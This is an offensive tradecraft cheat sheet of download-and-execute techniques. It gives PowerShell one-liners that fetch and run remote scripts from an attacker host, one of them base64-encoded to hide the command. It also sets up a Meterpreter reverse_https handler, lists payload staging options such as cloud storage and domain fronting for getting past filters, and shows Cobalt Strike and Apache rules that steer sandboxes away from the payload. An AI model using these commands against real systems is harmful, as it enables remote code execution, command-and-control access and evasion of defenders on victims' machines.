## Download & Execution One-Liners

---

### PowerShell

```powershell
# Basic download
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_IP>/payload.ps1')"

# With system proxy
powershell -command { $b=New-Object System.Net.WebClient; $b.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $b.DownloadString("http://<ATTACKER_IP>/payload.ps1") | IEX }

# Encoded command
$string = 'IEX (New-Object Net.WebClient).DownloadString("http://<ATTACKER_IP>/payload.ps1")'
$encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($string))
powershell.exe -EncodedCommand $encodedcommand
```

---

### Web Server

```sh
python3 -m http.server 8000
```

---

### Meterpreter Handler

```sh
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <ATTACKER_IP>
set LPORT 443
set EXITFUNC thread
run
```

---

### Staged Payload Hosting

| Method | Use Case |
|---|---|
| `python3 -m http.server` | Quick testing, no logging |
| Cobalt Strike web server | Integrated C2, conditional delivery |
| Sliver stage listener | Sliver-native stager support |
| Nginx/Apache | Production phishing infra, TLS support |
| Cloud storage (S3, Azure Blob) | Categorised domains, bypass URL filters |
| CDN (CloudFront, Fastly) | Domain fronting (if available) |

---

### Conditional Delivery

Serve payloads only to specific targets (user-agent, IP range, referrer) to avoid sandbox detonation:

```
# Cobalt Strike — Malleable C2 profile
http-get {
    set uri "/update";
    client {
        header "User-Agent" "Mozilla/5.0...";
    }
    server {
        # Only serve payload to matching requests
    }
}
```

```sh
# Apache mod_rewrite — redirect sandboxes to legitimate site
RewriteEngine On
RewriteCond %{HTTP_USER_AGENT} ".*sandbox.*" [NC,OR]
RewriteCond %{HTTP_USER_AGENT} ".*bot.*" [NC]
RewriteRule ^(.*)$ https://legitimate-site.com [L,R=302]
```

---

> See also: [[Tradecraft/Loaders/PowerShell Runners]], [[2. Weaponisation & Delivery/HTA Chains]]
